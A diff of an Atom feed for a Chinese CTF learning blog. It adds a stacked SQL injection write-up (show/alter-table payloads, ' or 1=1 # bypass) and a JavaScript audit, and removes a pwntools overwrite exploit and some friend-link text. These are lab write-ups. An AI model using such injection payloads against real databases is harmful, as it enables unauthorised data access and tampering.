@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-05-28T11:23:37.702Z</updated>
+    <updated>2020-05-28T11:38:32.974Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -14,43 +14,6 @@
         <title type="html"><![CDATA[攻防世界pwn新手区—hello_pwn]]></title>
         <id>https://zhangzy999.github.io/post/adworld_hello_pwn/</id>
         <link href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
-        </link>
-        <updated>2020-05-28T11:14:02.000Z</updated>
-        <content type="html"><![CDATA[<p>我们拿到附件后，然后简单的运行一下，发现程序让我们输入一个字符串，然后就没了（草率.jpg)<br>
-<img src="https://zhangzy999.github.io//post-images/1590664509396.png" alt="" loading="lazy"><br>
-然后我们检查一下程序开启了哪些保护</p>
-<pre><code>checksec filename
-</code></pre>
-<p>发现开启了NX保护（使得栈上的数据不可执行）<br>
-<img src="https://zhangzy999.github.io//post-images/1590664569065.png" alt="" loading="lazy"><br>
-我们用ida64位打开，直接看main的伪代码，发现一个read函数和一个if判断<br>
-<img src="https://zhangzy999.github.io//post-images/1590664604117.png" alt="" loading="lazy"><br>
-如果满足if条件，就能执行下面的一个函数，我们跟进这个函数，发现它可以cat flag<br>
-<img src="https://zhangzy999.github.io//post-images/1590664647984.png" alt="" loading="lazy"><br>
-if条件要满足，就能拿到flag，关键是if中的判断咯，我们跟进if的那个变量，发现它距离我们可以控制的那个变量只有四字节，而在read中我们可以输入十个字节，那么就是变量覆盖没跑了<br>
-<img src="https://zhangzy999.github.io//post-images/1590664736849.png" alt="" loading="lazy"><br>
-我们现在计算器中转下16进制，if中的那个数字到16进制就是0x6E756161是四个字节，美汁汁<br>
-写个exp打打就完事了（比攻防世界的第一个题还简单）</p>
-<pre><code>from pwn import *
-
-p = remote('124.126.19.106','48949')
-
-offset = 4
-
-payload = offset * 'a' + p64(0x6E756161)
-
-p.recvuntil(&quot;bof&quot;)
-p.sendline(payload)
-p.interactive()     #先养成良好习惯，加上这句话，免得以后打shellcode的时候忘了加-.-||
-</code></pre>
-<p>然后拿到flag<br>
-<img src="https://zhangzy999.github.io//post-images/1590664968599.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[攻防世界pwn新手区—hello_pwn]]></title>
-        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-hello_pwn/</id>
-        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-hello_pwn/">
         </link>
         <updated>2020-05-28T11:14:02.000Z</updated>
         <content type="html"><![CDATA[<p>我们拿到附件后，然后简单的运行一下，发现程序让我们输入一个字符串，然后就没了（草率.jpg)<br>
@@ -402,53 +365,14 @@ while True:
         <link href="https://zhangzy999.github.io/post/dalaoboke/">
         </link>
         <updated>2020-04-28T15:09:28.000Z</updated>
-        <content type="html"><![CDATA[<p>咳咳，第一个就是我的队长，想当年（两个月前），我还是个毛都不会的小屁孩（emm虽然现在也不怎么会），然后在一个比赛群里发现了七星哥哥，他那时候孤身一人参加了高校战疫比赛，拿到了97名我记得，emm虽然他自谦，但是在我这种小白的眼里确实很nb！！<br>
-然后他就建立了战队，我就追随大佬的脚步，成了我们队里的第一批队员。<br>
-七星很强的！现在开始pwn了已经，<s>每次有大牛的公开课，我们战队全指望他给我们录屏，所以我们战队也叫白嫖工作室</s>下面是他的博客地址，搭的比我好door♂了！<br>
+        <content type="html"><![CDATA[<p>七星<br>
 友链：<a href="http://qixingnet.top/">http://qixingnet.top/</a><br>
-我们的白嫖qq群（等你来白嫖，我们一起做白嫖怪）：613455190<br>
-<img src="https://zhangzy999.github.io//post-images/1588087082686.png" alt="" loading="lazy"></p>
-<p>咳咳，接下来这位大佬，我之前一有问题就奔向他！人也超级好超级帅超级聪明超级谦虚……的无敌堆堆！<br>
-一个双修web和pwn的大佬！<br>
-看到没，双修web和pwn诶，同是大一生，我望尘莫及555<br>
-所以在堆堆大佬的激励下（他总说自己不是大佬，脑壳痛），我准备也双修，emm，不过得是一段时间之后了<br>
-堆堆大佬的博客干货满满哟<br>
+堆堆<br>
 友链：<a href="https://duitutu.cn">https://duitutu.cn</a><br>
-<img src="https://zhangzy999.github.io//post-images/1588087482160.png" alt="" loading="lazy"></p>
-<p>咳咳，接下来这位大佬是个美女哦~<br>
-魔法少女雪殇，实力强的一批，大概战斗力能顶上十个我，sql注入，xss，文件上传，网站挂马，模板漏洞……无一不是她的强项，关键是是个小姐姐！还在等什么，快去她的博客逛逛吧！！！<br>
+魔法少女雪殇<br>
 友链：<a href="http://z.mofalongmao.xyz/wordpress/">http://z.mofalongmao.xyz/wordpress/</a><br>
-<img src="https://zhangzy999.github.io//post-images/1588687239795.png" alt="" loading="lazy"></p>
-<p>下面是R1v0ir大佬的博客~颜值超高哒！<br>
-友链：<a href="https://r1v0ir.github.io/">https://r1v0ir.github.io/</a><br>
-<img src="https://zhangzy999.github.io//post-images/1589271997965.png" alt="" loading="lazy"></p>
-<p>再次感谢大佬们的倾心相授，信息安全和CTF长路漫漫，终生学习，不断进步。<br>
-路在脚下，心在远方。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[日常生活—欢迎加入暗堡高智商俱乐部！]]></title>
-        <id>https://zhangzy999.github.io/post/anbao/</id>
-        <link href="https://zhangzy999.github.io/post/anbao/">
-        </link>
-        <updated>2020-04-28T14:52:24.000Z</updated>
-        <content type="html"><![CDATA[<p>暗堡高智商俱乐部，是一群沙雕们的世界，是女装大佬们的天堂！<br>
-如果你有梦想，如果你有希望，那么就来加入我们吧！<br>
-只有你想不到，没有我们做不到，奥力给，每天的水群和抢红包活动，你值得参与<br>
-在我们的家庭群里，你能找到各种各样的表情包，能发现各种各样的奇葩人才<br>
-心动不如行动，来看看我们的官网，是不是很酷炫吊炸天呢！<br>
-<a href="http://hiddensite.mysxl.cn/">http://hiddensite.mysxl.cn/</a><br>
-<strong>请复制该链接至浏览器打开</strong><br>
-<img src="https://zhangzy999.github.io//post-images/1588085691771.png" alt="" loading="lazy"><br>
-我们的证书是不是也很好看高大上嘞，通过免试或者考试，你，将被暗堡收录<br>
-在网页上你可以找到你的名字，你还可以拥有自己的证书，奥力给，还等什么<br>
-证书如下哟：<br>
-<img src="https://zhangzy999.github.io//post-images/1588085849998.png" alt="" loading="lazy"><br>
-自此，你有了装逼的资本，你有了无尽的财富，你有了一个会女装的天才会长……<br>
-咳咳，跑题了，有意向者前往官网吧，那里有暗堡的联系方式<br>
-暗堡<s>低智商</s>高智商协会，等你来战！<br>
-下面是公众号和候考群的二维码：<br>
-<img src="https://zhangzy999.github.io//post-images/1588120513038.png" alt="" loading="lazy"></p>
+R1v0ir<br>
+友链：<a href="https://r1v0ir.github.io/">https://r1v0ir.github.io/</a></p>
 ]]></content>
     </entry>
     <entry>
@@ -564,6 +488,128 @@ OK，拿到cookie了，然后开始扫描康康管理员的后台登录界面<br
 如果大家对sql注入的赛题感兴趣，请在哔哩哔哩上搜索up主：yuyu-宇<br>
 这个是我的主页，我做了很多包括教学视频和刷题视频，都是sql注入方面的<br>
 如果文章内容哪里不对，还请哔哩哔哩私信联系我，蟹蟹大家！！</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CTF-强网杯-“随便注”]]></title>
+        <id>https://zhangzy999.github.io/post/suibianzhu/</id>
+        <link href="https://zhangzy999.github.io/post/suibianzhu/">
+        </link>
+        <updated>2020-04-28T00:46:16.000Z</updated>
+        <content type="html"><![CDATA[<p>我们打开环境，很简单的一个页面，这emmm<br>
+<img src="https://zhangzy999.github.io//post-images/1588035195215.png" alt="" loading="lazy"><br>
+大家肯定首先想到了SQL注入，那么其实呢，这道题吧……<br>
+没错它就是SQL注入（逃<br>
+然后我们输入1，2之类的，发现页面正常回显<br>
+在这里我们先不fuzz模糊测试了，对，你还要打开burp，还要加载字典😵（懒）<br>
+我们就直接淦吧！！！<br>
+对了，插句话，之前一段时间专注于sql注入的学习，然后本博主做了一系列的教学和刷题视频放到了哔哩哔哩上，有mysql的一些知识和极客大挑战中所有的sql注入赛题，哔哩哔哩搜索”yuyu-宇“，带给你不一样的快乐♂<br>
+好，言归正传，我们开始验证下是否是sql注入，输入</p>
+<pre><code>1' #
+</code></pre>
+<p>页面能够正常回显，那就没跑了<br>
+下面order by干一干<br>
+<img src="https://zhangzy999.github.io//post-images/1588037367163.png" alt="" loading="lazy"><br>
+2不报错，3就报错了，好，那么select语句里面应该有两个字段<br>
+联合查询下康康~<br>
+<img src="https://zhangzy999.github.io//post-images/1588037579533.png" alt="" loading="lazy"><br>
+<s>mmp过滤了那么多玩意我还怎么玩，溜了溜了</s><br>
+好，这个时候既然过滤了select，貌似不可能注入了，不过，等等，<s>愚蠢的</s>开发者的第一个失误，没有过滤分号！（ohhhhh）<br>
+堆叠注入来一波试试！</p>
+<pre><code class="language-MySql">1';show databases; #
+</code></pre>
+<p><img src="https://zhangzy999.github.io//post-images/1588038142436.png" alt="" loading="lazy"><br>
+very good!<br>
+我们继续搞一搞</p>
+<pre><code class="language-mysql">1' show tables; #
+</code></pre>
+<p><img src="https://zhangzy999.github.io//post-images/1588038521819.png" alt="" loading="lazy"><br>
+可以看到后端默认查询的数据库有俩表，接下来要用到那么一丢丢小技巧了</p>
+<blockquote>
+<p>如何用show语句查列嘞？<br>
+<code>show columns from 表</code></p>
+</blockquote>
+<p>所以我们查查这俩表里面都有什么好康的（逐渐猥琐）<br>
+先看看那个数字命名的表吧，注意哈，如果表名是数字要加上反引号</p>
+<pre><code>';show columns from `1919810931114514`; # 
+</code></pre>
+<p><img src="https://zhangzy999.github.io//post-images/1588039381912.png" alt="" loading="lazy"><br>
+可以看到我们想要的flag字段就在这个表里面，这时候，彷佛我们已经看到了胜利的曙光<br>
+OK，我们在看看”words“表里面有啥</p>
+<pre><code>';show columns from words; #
+</code></pre>
+<p><img src="https://zhangzy999.github.io//post-images/1588039674796.png" alt="" loading="lazy"><br>
+诶，这个是不是看起来有那么一丢丢熟悉的亚子，没错了，我们一开始查询的时候呢，就是输入id查数据，应该就是在这个表里面查的，现在问题来了，我们想要flag，但是，select又被防火墙干掉了，彷佛是一个无解的题目，但是，<strong>本文最精彩最精彩最精彩的地方来了</strong><br>
+笔者见过常规的绕过防火墙保护的姿势，但是看到这个姿势，我当时真的眼前一亮，学到了学到了，果然，做渗透的师傅们的脑洞都很大emm<br>
+<strong>用alter和rename把&quot;flag&quot;字段所在的表命名为'words'，给它改成&quot;data&quot;，再把原本的&quot;id&quot;改成别的名字，这样，因为数据库查的是&quot;id&quot;，它可不管&quot;id&quot;里面是啥，他就只认识&quot;id&quot;这个名字，所以我们就理所应当的拿到了flag</strong><br>
+最终的攻击语句</p>
+<pre><code class="language-mysql">';alter table words rename 小张到此一游;alter table `1919810931114514` rename words;
+alter table words change flag id varchar(100);#
+</code></pre>
+<p>注意，最后一条语句中的words其实是我们的那个flag所在的表，它的名字已经被我们改成words了<br>
+然后我们来用万能密码爆flag就可以啦~<br>
+<code>' or 1=1 #</code><br>
+<img src="https://zhangzy999.github.io//post-images/1588041692949.png" alt="" loading="lazy"><br>
+至此，我们已经拿到这个题目的flag了，然后再让我们来康康表名有没有被改（滑稽）<br>
+<img src="https://zhangzy999.github.io//post-images/1588041782420.png" alt="" loading="lazy"><br>
+很好，如果是真实环境，不知道网站的数据库管理人员看到“小张到此一游”的表情该有多么精彩👻<br>
+所以，开发的时候一定要兼顾安全！！尤其是涉及到数据库的安全<br>
+<s>我们回到攻击语句那里，甚至可以改下原来的words字段名字，改成 &quot;小张 is my hero&quot;</s><br>
+大家有问题可以在哔哩哔哩私信我哟</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[攻防世界web新手区javascript审计-"sample js"]]></title>
+        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-web-xin-shou-qu-gong-lue-yi-lan/</id>
+        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-web-xin-shou-qu-gong-lue-yi-lan/">
+        </link>
+        <updated>2020-04-27T03:24:13.000Z</updated>
+        <content type="html"><![CDATA[<p>打开环境，浏览器弹出窗口提示我们输入密码<br>
+<img src="https://zhangzy999.github.io//post-images/1587959009848.png" alt="" loading="lazy"></p>
+<p>我们习惯性的查看页面源码，并且题目已经给我们提示：“simple js”<br>
+得到一串js代码，应该是让我们审计js代码没跑了o.o<br>
+<img src="https://zhangzy999.github.io//post-images/1587959071008.png" alt="" loading="lazy"></p>
+<pre><code class="language-JavaScript">    function dechiffre(pass_enc){           //这一部分是定义了一个函数dechiffre,参数为pass_enc
+        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;     //定义了pass字符串
+        var tab  = pass_enc.split(',');     //定义了tab变量，其中.split()方法是将一个字符串分割为字符数组，括号里单引号下的逗号是按逗号分割
+                var tab2 = pass.split(',');     //tab2变量是对pass字符串进行的分割
+                var i,j,k,l=0,m,n,o,p = &quot;&quot;;     // 定义了许多变量，其中未被赋值的变量为undefined
+                i = 0;
+                j = tab.length;     //.length是返回tab数组的长度，j=36
+                k = j + (l) + (n=0);
+                n = tab2.length;    // 先定义了n=0，k=18+0+0=18     然后给n赋值n=18
+                for(i = (o=0); i &lt; (k = j = n); i++ )       //条件是i=0,i&lt;18(把n的值赋给j，再把j的值赋给k)
+                {
+                    o = tab[i-l];       //先把tab[i-1]的值赋给o但是我们会发现，后面紧接着有把tab2[i]的值赋给o，这一条语句相当于无用
+                    p += String.fromCharCode((o = tab2[i]));    //上面定义了变量p=“”,String.fromCharCode()方法是把Unicode编码转化为字符串
+                    if(i == 5)
+                        break;        
+                 }      // 通过运行此程序段，并且加上document.write(p+”&lt;br/&gt;”);输出p的值我们发现p=FAUX P
+                 for(i = (o=0); i &lt; (k = j = n); i++ ){     // 第二个for循环，i=0，i&lt;18,i++ 
+                        o = tab[i-l];
+                        if(i &gt; 5 &amp;&amp; i &lt; k-1)
+                             p += String.fromCharCode((o = tab2[i]));      //该条循环与上个循环相似，最终发现输出的p=FAUX PASSWORD HAH
+                        }
+        p += String.fromCharCode(tab2[17]);   
+        pass = p;
+        return pass;    //完整的p是p=p=FAUX PASSWORD HAHA（假的密码哈哈）😢
+    }
+    //最终函数返回p，但仔细观察我们发现p始终与tab2挂钩，而tab2的值是pass分割成数组的值，pass是定值，也就是说我们函数的参数pass_enc在这个函数里无用！
+    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
+    h = window.prompt('Enter password');
+    alert( dechiffre(h) );
+</code></pre>
+<p>以上我用注释的形式来为大家解释了每一条语句的作用，如果你是比我还萌的萌新，仔细看看肯定是会有收获的（狗头保命）<br>
+通过分析我们发现了我们传入的参数p对函数最后返回的结果毫无影响，<strong>因为无论我们输入什么都存到了tab里，而整个函数是对tab2这个数组的操作，无论我们输入什么，最终页面都返回给我们faux password haha</strong>,所以通过分析，那一串16进制的数字转码后应该就是flag了，因为它孤零零的在那里，前不着村后不着店，煞是诡异。。。<br>
+所以我们就自己写js代码，把他翻译出来，bingo!<br>
+首先我们先把那一串\x的给翻译成ascii，在python中自动完成：<br>
+<img src="https://zhangzy999.github.io//post-images/1587970672958.png" alt="" loading="lazy"><br>
+然后直接调用fromCharCode方法得到flag</p>
+<pre><code class="language-JavaScript">var password = String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
+console.log(password);
+</code></pre>
+<p><img src="https://zhangzy999.github.io//post-images/1587971171189.png" alt="" loading="lazy"><br>
+以上就是本题的解法，个人认为该题目还是有那么一丢丢难度的（毕竟我js不太好😶）</p>
 ]]></content>
     </entry>
 </feed>
